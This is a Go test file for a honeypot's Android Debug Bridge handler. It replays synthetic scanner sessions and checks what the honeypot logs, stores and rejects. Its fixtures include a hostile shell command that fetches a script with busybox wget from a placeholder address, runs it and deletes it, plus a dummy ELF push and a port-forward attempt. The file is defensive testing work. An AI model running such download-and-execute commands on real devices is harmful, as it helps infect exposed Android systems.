package tcp

import (
	"bytes"
	"context"
	"encoding/binary"
	"net"
	"testing"
	"time"

	"github.com/mushorg/glutton/connection"
	"github.com/mushorg/glutton/protocols/helpers"
	"github.com/mushorg/glutton/protocols/tcp/adb"
	"github.com/stretchr/testify/require"
)

// Fixtures are synthetic: transport messages built from AOSP protocol.txt /
// SYNC.TXT, shaped like the ADB.Miner-style scanners seen on tcp/5555.

type adbTestClient struct {
	t *testing.T
	c net.Conn
}

func (a adbTestClient) send(cmd, arg0, arg1 uint32, data []byte) []byte {
	a.t.Helper()
	msg := adb.Build(cmd, arg0, arg1, data)
	_, err := a.c.Write(msg)
	require.NoError(a.t, err)
	return msg
}

func (a adbTestClient) expect(cmd, arg0, arg1 uint32, data []byte) []byte {
	a.t.Helper()
	_, raw, err := adb.ReadMessage(a.c, adb.MaxPayload)
	require.NoError(a.t, err)
	want := adb.Build(cmd, arg0, arg1, data)
	require.Equal(a.t, want, raw)
	return raw
}

// runADB drives HandleADB with script and returns the single produced event
// and the files handed to the store.
func runADB(t *testing.T, script func(a adbTestClient)) (producedTCP, map[string][]byte) {
	t.Helper()
	stored := map[string][]byte{}
	prevStore := adbStore
	adbStore = func(data []byte, folder string) (string, error) {
		require.Equal(t, "payloads/adb", folder)
		hash := helpers.SHA256Hex(data)
		stored[hash] = bytes.Clone(data)
		return hash, nil
	}
	t.Cleanup(func() { adbStore = prevStore })

	client, serverConn := net.Pipe()
	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleADB(context.Background(), serverConn, connection.Metadata{TargetPort: 5555}, &recordingLogger{}, hp)
	}()
	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
	script(adbTestClient{t: t, c: client})
	require.NoError(t, client.Close())

	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not return")
	}
	var ev producedTCP
	select {
	case ev = <-hp.produced:
	case <-time.After(2 * time.Second):
		t.Fatal("timed out waiting for produced ADB event")
	}
	require.Equal(t, "adb", ev.protocol)
	require.Empty(t, hp.produced, "exactly one event per session")
	return ev, stored
}

var adbHostCNXN = []byte("host::\x00")

func adbConnect(a adbTestClient) (read, write []byte) {
	read = a.send(adb.CmdCNXN, 0x01000000, 4096, adbHostCNXN)
	write = a.expect(adb.CmdCNXN, adbVersion, adbMaxData, []byte(adbIdentity))
	return read, write
}

func adbConnectFrames(read, write []byte) []parsedADB {
	return []parsedADB{
		{Direction: "read", Packet: "CNXN", Command: "CNXN", Identity: "host::", Payload: read},
		{Direction: "write", Packet: "CNXN", Command: "CNXN", Identity: "device::ro.product.name=p281;ro.product.model=MBOX;ro.product.device=p281;", Payload: write},
	}
}

func TestHandleADBShellCommand(t *testing.T) {
	const cmd = "cd /data/local/tmp/; busybox wget http://198.51.100.7/adbs -O -> adbs; sh adbs; rm adbs"
	var cr, cw, open, okay, clse []byte
	ev, stored := runADB(t, func(a adbTestClient) {
		cr, cw = adbConnect(a)
		open = a.send(adb.CmdOPEN, 7, 0, []byte("shell:"+cmd+"\x00"))
		okay = a.expect(adb.CmdOKAY, 1, 7, nil)
		clse = a.expect(adb.CmdCLSE, 1, 7, nil)
	})
	require.Empty(t, stored)
	require.Equal(t, connection.EndClientClose, ev.endReason)
	require.Equal(t, append(adbConnectFrames(cr, cw),
		parsedADB{Direction: "read", Packet: "OPEN", Command: "shell", Args: cmd, Payload: open},
		parsedADB{Direction: "write", Packet: "OKAY", Command: "shell", Status: "accepted", Payload: okay},
		parsedADB{Direction: "write", Packet: "CLSE", Command: "shell", Payload: clse},
	), ev.decoded)
}

func TestHandleADBShellRecon(t *testing.T) {
	var cr, cw, open1, okay1, out1, clse1, open2, okay2, out2, clse2 []byte
	ev, _ := runADB(t, func(a adbTestClient) {
		cr, cw = adbConnect(a)
		open1 = a.send(adb.CmdOPEN, 1, 0, []byte("shell:getprop ro.product.model\x00"))
		okay1 = a.expect(adb.CmdOKAY, 1, 1, nil)
		out1 = a.expect(adb.CmdWRTE, 1, 1, []byte("MBOX\n"))
		clse1 = a.expect(adb.CmdCLSE, 1, 1, nil)
		open2 = a.send(adb.CmdOPEN, 2, 0, []byte("exec:echo 'ok'\x00"))
		okay2 = a.expect(adb.CmdOKAY, 2, 2, nil)
		out2 = a.expect(adb.CmdWRTE, 2, 2, []byte("ok\n"))
		clse2 = a.expect(adb.CmdCLSE, 2, 2, nil)
	})
	require.Equal(t, append(adbConnectFrames(cr, cw),
		parsedADB{Direction: "read", Packet: "OPEN", Command: "shell", Args: "getprop ro.product.model", Payload: open1},
		parsedADB{Direction: "write", Packet: "OKAY", Command: "shell", Status: "accepted", Payload: okay1},
		parsedADB{Direction: "write", Packet: "WRTE", Command: "shell", Payload: out1},
		parsedADB{Direction: "write", Packet: "CLSE", Command: "shell", Payload: clse1},
		parsedADB{Direction: "read", Packet: "OPEN", Command: "exec", Args: "echo 'ok'", Payload: open2},
		parsedADB{Direction: "write", Packet: "OKAY", Command: "exec", Status: "accepted", Payload: okay2},
		parsedADB{Direction: "write", Packet: "WRTE", Command: "exec", Payload: out2},
		parsedADB{Direction: "write", Packet: "CLSE", Command: "exec", Payload: clse2},
	), ev.decoded)
}

func TestHandleADBInteractiveShell(t *testing.T) {
	var cr, cw, open, okay, prompt, ack, in1, out1, in2, clse []byte
	ev, _ := runADB(t, func(a adbTestClient) {
		cr, cw = adbConnect(a)
		open = a.send(adb.CmdOPEN, 3, 0, []byte("shell:\x00"))
		okay = a.expect(adb.CmdOKAY, 1, 3, nil)
		prompt = a.expect(adb.CmdWRTE, 1, 3, []byte(adbPrompt))
		ack = a.send(adb.CmdOKAY, 3, 1, nil)
		in1 = a.send(adb.CmdWRTE, 3, 1, []byte("uname -m\n"))
		a.expect(adb.CmdOKAY, 1, 3, nil) // flow-control ack, not recorded
		out1 = a.expect(adb.CmdWRTE, 1, 3, []byte("armv7l\n"+adbPrompt))
		in2 = a.send(adb.CmdWRTE, 3, 1, []byte("exit\n"))
		a.expect(adb.CmdOKAY, 1, 3, nil)
		clse = a.expect(adb.CmdCLSE, 1, 3, nil)
	})
	require.Equal(t, append(adbConnectFrames(cr, cw),
		parsedADB{Direction: "read", Packet: "OPEN", Command: "shell", Payload: open},
		parsedADB{Direction: "write", Packet: "OKAY", Command: "shell", Status: "accepted", Payload: okay},
		parsedADB{Direction: "write", Packet: "WRTE", Command: "shell", Payload: prompt},
		parsedADB{Direction: "read", Packet: "OKAY", Command: "OKAY", Payload: ack},
		parsedADB{Direction: "read", Packet: "WRTE", Command: "shell", Args: "uname -m", Payload: in1},
		parsedADB{Direction: "write", Packet: "WRTE", Command: "shell", Payload: out1},
		parsedADB{Direction: "read", Packet: "WRTE", Command: "shell", Args: "exit", Payload: in2},
		parsedADB{Direction: "write", Packet: "CLSE", Command: "shell", Payload: clse},
	), ev.decoded)
}

func adbSync(id string, body []byte) []byte {
	b := make([]byte, 8, 8+len(body))
	copy(b, id)
	binary.LittleEndian.PutUint32(b[4:], uint32(len(body)))
	return append(b, body...)
}

func adbSyncDone(mtime uint32) []byte {
	b := []byte("DONE\x00\x00\x00\x00")
	binary.LittleEndian.PutUint32(b[4:], mtime)
	return b
}

func TestHandleADBPush(t *testing.T) {
	const remote = "/data/local/tmp/nohup"
	file := []byte("\x7fELF\x01\x01\x01\x00payload-part-one|payload-part-two|tail")
	var cr, cw, open, okay, stat, statReply, send1, send2, send3, sendReply, quit, clse []byte
	ev, stored := runADB(t, func(a adbTestClient) {
		cr, cw = adbConnect(a)
		open = a.send(adb.CmdOPEN, 9, 0, []byte("sync:\x00"))
		okay = a.expect(adb.CmdOKAY, 1, 9, nil)

		stat = a.send(adb.CmdWRTE, 9, 1, adbSync("STAT", []byte("/data/local/tmp")))
		a.expect(adb.CmdOKAY, 1, 9, nil)
		statReply = a.expect(adb.CmdWRTE, 1, 9, adb.SyncStat(adbDirMode, 4096, adbMtime))
		a.send(adb.CmdOKAY, 9, 1, nil)

		// SEND + first DATA, a DATA-only WRTE, then the last DATA + DONE
		send1 = a.send(adb.CmdWRTE, 9, 1, append(adbSync("SEND", []byte(remote+",33261")), adbSync("DATA", file[:20])...))
		a.expect(adb.CmdOKAY, 1, 9, nil)
		send2 = a.send(adb.CmdWRTE, 9, 1, adbSync("DATA", file[20:37]))
		a.expect(adb.CmdOKAY, 1, 9, nil)
		send3 = a.send(adb.CmdWRTE, 9, 1, append(adbSync("DATA", file[37:]), adbSyncDone(adbMtime)...))
		a.expect(adb.CmdOKAY, 1, 9, nil)
		sendReply = a.expect(adb.CmdWRTE, 1, 9, adb.SyncOkay())
		a.send(adb.CmdOKAY, 9, 1, nil)

		quit = a.send(adb.CmdWRTE, 9, 1, adbSync("QUIT", nil))
		a.expect(adb.CmdOKAY, 1, 9, nil)
		clse = a.expect(adb.CmdCLSE, 1, 9, nil)
	})
	hash := helpers.SHA256Hex(file)
	require.Equal(t, map[string][]byte{hash: file}, stored)

	okayRead := adb.Build(adb.CmdOKAY, 9, 1, nil)
	require.Equal(t, append(adbConnectFrames(cr, cw),
		parsedADB{Direction: "read", Packet: "OPEN", Command: "sync", Payload: open},
		parsedADB{Direction: "write", Packet: "OKAY", Command: "sync", Status: "accepted", Payload: okay},
		parsedADB{Direction: "read", Packet: "WRTE", Command: "sync", Sync: []string{"STAT"}, Path: "/data/local/tmp", Payload: stat},
		parsedADB{Direction: "write", Packet: "WRTE", Command: "sync", Status: "STAT", Path: "/data/local/tmp", Payload: statReply},
		parsedADB{Direction: "read", Packet: "OKAY", Command: "OKAY", Payload: okayRead},
		parsedADB{Direction: "read", Packet: "WRTE", Command: "sync", Sync: []string{"SEND", "DATA"}, Path: remote, Payload: append(bytes.Clone(send1), send2...)},
		parsedADB{Direction: "read", Packet: "WRTE", Command: "sync", Sync: []string{"DATA", "DONE"}, Path: remote, PayloadHash: hash, Size: len(file), Payload: send3},
		parsedADB{Direction: "write", Packet: "WRTE", Command: "sync", Status: "OKAY", Path: remote, Payload: sendReply},
		parsedADB{Direction: "read", Packet: "OKAY", Command: "OKAY", Payload: okayRead},
		parsedADB{Direction: "read", Packet: "WRTE", Command: "sync", Sync: []string{"QUIT"}, Payload: quit},
		parsedADB{Direction: "write", Packet: "CLSE", Command: "sync", Payload: clse},
	), ev.decoded)
}

func TestHandleADBPushCaptureCap(t *testing.T) {
	file := bytes.Repeat([]byte("A"), 3*maxADBCapture)
	ev, stored := runADB(t, func(a adbTestClient) {
		adbConnect(a)
		a.send(adb.CmdOPEN, 1, 0, []byte("sync:\x00"))
		a.expect(adb.CmdOKAY, 1, 1, nil)
		a.send(adb.CmdWRTE, 1, 1, adbSync("SEND", []byte("/sdcard/a,33206")))
		a.expect(adb.CmdOKAY, 1, 1, nil)
		for off := 0; off < len(file); off += 4000 {
			a.send(adb.CmdWRTE, 1, 1, adbSync("DATA", file[off:min(off+4000, len(file))]))
			a.expect(adb.CmdOKAY, 1, 1, nil)
		}
		a.send(adb.CmdWRTE, 1, 1, adbSyncDone(0))
		a.expect(adb.CmdOKAY, 1, 1, nil)
		a.expect(adb.CmdWRTE, 1, 1, adb.SyncOkay())
	})
	hash := helpers.SHA256Hex(file)
	require.Equal(t, map[string][]byte{hash: file}, stored, "the file is stored whole")

	frames := ev.decoded.([]parsedADB)
	require.Len(t, frames, 7, "DATA-only WRTEs aggregate into the SEND frame")
	sendFrame := frames[4]
	require.Equal(t, []string{"SEND", "DATA"}, sendFrame.Sync)
	require.True(t, sendFrame.Truncated)
	total := 0
	for _, f := range frames {
		total += len(f.Payload)
	}
	require.LessOrEqual(t, total, maxADBCapture)
	require.Equal(t, hash, frames[5].PayloadHash)
	require.Equal(t, len(file), frames[5].Size)
	require.True(t, frames[5].Truncated, "capture budget exhausted")
}

func TestHandleADBRejectsForward(t *testing.T) {
	var cr, cw, open, clse []byte
	ev, _ := runADB(t, func(a adbTestClient) {
		cr, cw = adbConnect(a)
		open = a.send(adb.CmdOPEN, 4, 0, []byte("tcp:203.0.113.5:80\x00"))
		clse = a.expect(adb.CmdCLSE, 0, 4, nil)
	})
	require.Equal(t, append(adbConnectFrames(cr, cw),
		parsedADB{Direction: "read", Packet: "OPEN", Command: "tcp", Args: "203.0.113.5:80", Payload: open},
		parsedADB{Direction: "write", Packet: "CLSE", Command: "tcp", Status: "rejected", Payload: clse},
	), ev.decoded)
}

func TestHandleADBOpenBeforeConnectIgnored(t *testing.T) {
	var open []byte
	ev, _ := runADB(t, func(a adbTestClient) {
		// a CNXN is required before services; the device stays silent
		open = adb.Build(adb.CmdOPEN, 1, 0, []byte("shell:id\x00"))
		_, err := a.c.Write(open)
		require.NoError(t, err)
	})
	require.Equal(t, []parsedADB{
		{Direction: "read", Packet: "OPEN", Command: "shell", Args: "id", Payload: open},
	}, ev.decoded)
}

func TestHandleADBAuthRecorded(t *testing.T) {
	var auth []byte
	ev, _ := runADB(t, func(a adbTestClient) {
		auth = a.send(adb.CmdAUTH, 3, 0, []byte("QAAAAPubKey user@host\x00"))
	})
	require.Equal(t, []parsedADB{
		{Direction: "read", Packet: "AUTH", Command: "AUTH", AuthType: "RSAPUBLICKEY", Payload: auth},
	}, ev.decoded)
}

func TestHandleADBEarlyDisconnect(t *testing.T) {
	cnxn := adb.Build(adb.CmdCNXN, 0x01000000, 4096, adbHostCNXN)
	ev, _ := runADB(t, func(a adbTestClient) {
		_, err := a.c.Write(cnxn[:10])
		require.NoError(t, err)
	})
	require.Equal(t, []parsedADB{{Direction: "read", Payload: cnxn[:10]}}, ev.decoded)

	ev, _ = runADB(t, func(a adbTestClient) {
		_, err := a.c.Write(cnxn[:27]) // full header, short body
		require.NoError(t, err)
	})
	require.Equal(t, []parsedADB{{Direction: "read", Packet: "CNXN", Command: "CNXN", Payload: cnxn[:27]}}, ev.decoded)
}

func TestHandleADBMalformed(t *testing.T) {
	bad := adb.Build(adb.CmdCNXN, 0x01000000, 4096, adbHostCNXN)
	bad[20] ^= 0xff
	ev, _ := runADB(t, func(a adbTestClient) {
		_, err := a.c.Write(bad)
		require.NoError(t, err)
	})
	require.Equal(t, connection.EndReadError, ev.endReason)
	require.Equal(t, []parsedADB{{Direction: "read", Packet: "CNXN", Command: "CNXN", Payload: bad[:adb.HeaderLen]}}, ev.decoded)

	huge := adb.Build(adb.CmdWRTE, 1, 1, nil)
	binary.LittleEndian.PutUint32(huge[12:], adb.MaxPayload+1)
	ev, _ = runADB(t, func(a adbTestClient) {
		_, err := a.c.Write(huge)
		require.NoError(t, err)
	})
	require.Equal(t, connection.EndReadError, ev.endReason)
	require.Equal(t, []parsedADB{{Direction: "read", Packet: "WRTE", Command: "WRTE", Payload: huge, Truncated: true}}, ev.decoded)
}

func TestHandleADBHostRequest(t *testing.T) {
	ev, _ := runADB(t, func(a adbTestClient) {
		_, err := a.c.Write([]byte("000chost:version"))
		require.NoError(t, err)
	})
	require.Equal(t, []parsedADB{
		{Direction: "read", Command: "host", Payload: []byte("host:version")},
	}, ev.decoded)
}

func TestADBShellOutput(t *testing.T) {
	require.Equal(t, "MBOX\n", adbShellOutput(" getprop ro.product.model "))
	require.Equal(t, "hi\n", adbShellOutput(`echo "hi"`))
	require.Empty(t, adbShellOutput("echo $(id)"))
	require.Empty(t, adbShellOutput("cd /data/local/tmp; wget http://198.51.100.7/x"))
}
